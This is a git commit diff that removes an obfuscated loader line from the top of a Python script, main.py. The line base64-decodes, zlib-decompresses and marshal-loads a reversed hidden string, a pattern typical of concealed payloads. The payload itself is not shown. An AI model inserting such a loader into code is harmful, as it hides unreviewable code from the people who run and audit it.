9bc96218a030136c5626dcbc34efd77432979528
CPMAizal <cpmayyyan@gmail.com>
2024-09-18 20:17:47 +0500

    Update main.py

--- main.py
+++ main.py
@@ -1,10 +1,3 @@
-import lzma
-import zlib
-import codecs
-import base64
-__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));
-
-
 import random
 import requests
 from time import sleep
